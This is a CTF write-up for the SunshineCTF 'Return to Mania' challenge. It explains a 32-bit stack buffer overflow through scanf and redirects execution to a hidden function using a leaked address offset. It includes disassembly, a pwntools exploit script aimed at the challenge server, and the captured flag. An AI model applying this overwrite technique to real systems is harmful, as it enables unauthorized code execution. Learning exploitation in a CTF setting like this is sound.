## SunshineCTF: Return to Mania
##### *tl;dr: buffer overflow to change instruction pointer*
#### First pwn challenge worth 50 points, we start reconnaissance with ```checksec```:
```
$ checksec return-to-mania
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```
#### From the results, we see that the binary has a non-executable stack, but we can still perform a buffer overflow since there isn't a stack canary in place. Also, we have to note that PIE is enabled which means that the addresses for functions are in a randomized layout. We run the binary to have an initial look on what it does:
```
$ ./return-to-mania
  Welcome to WrestleMania! Type in key to get access.
  addr of welcome(): 0x5658c6ed
```
#### We'll be testing this locally for now, but when we run the binary on the challenge server, we get a different address for welcome everytime. So what the binary does is print some stuff out, give us the address for welcome, and wait for user input. To see the inner workings of the binary, we open it in gdb:
```
$ gdb ./return-to-mania
  gdb-peda$ disas main
    Dump of assembler code for function main:
     0x00000746 <+0>:	  lea    ecx,[esp+0x4]
     0x0000074a <+4>:	  and    esp,0xfffffff0
     0x0000074d <+7>:	  push   DWORD PTR [ecx-0x4]
     0x00000750 <+10>:	  push   ebp
     0x00000751 <+11>:	  mov    ebp,esp
     0x00000753 <+13>:	  push   ebx
     0x00000754 <+14>:	  push   ecx
     0x00000755 <+15>:	  call   0x560 <__x86.get_pc_thunk.bx>
     0x0000075a <+20>:	  add    ebx,0x13f2
     0x00000760 <+26>:	  call   0x6ed <welcome>
     0x00000765 <+31>:	  sub    esp,0xc
     0x00000768 <+34>:	  lea    eax,[ebx-0x12cc]
     0x0000076e <+40>:	  push   eax
     0x0000076f <+41>:	  call   0x4d0 <puts@plt>
     0x00000774 <+46>:	  add    esp,0x10
     0x00000777 <+49>:	  mov    eax,0x0
     0x0000077c <+54>:	  lea    esp,[ebp-0x8]
     0x0000077f <+57>:	  pop    ecx
     0x00000780 <+58>:	  pop    ebx
     0x00000781 <+59>:	  pop    ebp
     0x00000782 <+60>:	  lea    esp,[ecx-0x4]
     0x00000785 <+63>:	  ret    
   End of assembler dump.
```
#### Basically, the main function just heads on to call the welcome function, so that's what we have to focus on disassembling. 
```
 gdb-peda$ disas welcome
   Dump of assembler code for function welcome:
     0x000006ed <+0>:	  push   ebp
     0x000006ee <+1>:	  mov    ebp,esp
     0x000006f0 <+3>:	  push   ebx
     0x000006f1 <+4>:	  sub    esp,0x14
     0x000006f4 <+7>:	  call   0x560 <__x86.get_pc_thunk.bx>
     0x000006f9 <+12>:	  add    ebx,0x1453
     0x000006ff <+18>:	  sub    esp,0xc
     0x00000702 <+21>:	  lea    eax,[ebx-0x131c]
     0x00000708 <+27>:	  push   eax
     0x00000709 <+28>:	  call   0x4d0 <puts@plt>
     0x0000070e <+33>:	  add    esp,0x10
     0x00000711 <+36>:	  sub    esp,0x8
     0x00000714 <+39>:	  lea    eax,[ebx-0x145f]
     0x0000071a <+45>:	  push   eax
     0x0000071b <+46>:	  lea    eax,[ebx-0x12e8]
     0x00000721 <+52>:	  push   eax
     0x00000722 <+53>:	  call   0x490 <printf@plt>
     0x00000727 <+58>:	  add    esp,0x10
     0x0000072a <+61>:	  sub    esp,0x8
     0x0000072d <+64>:	  lea    eax,[ebp-0x12]
     0x00000730 <+67>:	  push   eax
     0x00000731 <+68>:	  lea    eax,[ebx-0x12d1]
     0x00000737 <+74>:	  push   eax
     0x00000738 <+75>:	  call   0x500 <__isoc99_scanf@plt>
     0x0000073d <+80>:	  add    esp,0x10
     0x00000740 <+83>:	  nop
     0x00000741 <+84>:	  mov    ebx,DWORD PTR [ebp-0x4]
     0x00000744 <+87>:	  leave  
     0x00000745 <+88>:	  ret    
  End of assembler dump.
```
#### Analyzing the instructions, we see puts and printf being called, which we know just prints the stuff that we see when we start the binary. What we do want to pay attention to starts at address ```0x0000072a```, we see that the code creates space in the stack and initializes a buffer of 18(0x12) bytes - then we proceed to a ```scanf()``` call which we can exploit by putting in more stuff than it expects. By inputting 18 bytes of input and adding 4 additional bytes, we can now be able to overwrite the instruction pointer. But where do we jump to? Let's take a look at the functions that we have.
```
gdb-peda$ info functions
  [...]
  0x0000065d  mania
  0x000006ed  welcome
  0x00000746  main
  [...]
```
#### We see the ```mania``` function, but we don't see it get executed in the main function, so this is what we want to jump into and execute. We need to consider that the binary has its ASLR feature turned on, but that won't be a problem - since the offset between the addresses of each function is always the same. The addresses of the functions mania and welcome have a difference of 144, what we can do with this is whenever we're presented with the address of the welcome function in the start of the challenge, we can subtract 144 from it and we get the address for mania. So let's create our exploit script:
##### exploit.py  
```python
#: Connect to challenge server
HOST = 'ret.sunshinectf.org' 
PORT = 4301
p = remote(HOST,PORT)
prompt = p.recv()

#: Exploit code
offset = 'A' * 22
welcome_addr = int(prompt.splitlines()[1].split()[-1],16)
mania_addr = p32(welcome_addr - 144)
exploit = offset + mania_addr

#: Send payload
p.sendline(exploit)
print(p.recv())
```
#### Then we run it to get the flag!
```
$ python exploit.py
    WELCOME TO THE RING!
    sun{0V3rfl0w_rUn_w!Ld_br0th3r}
```
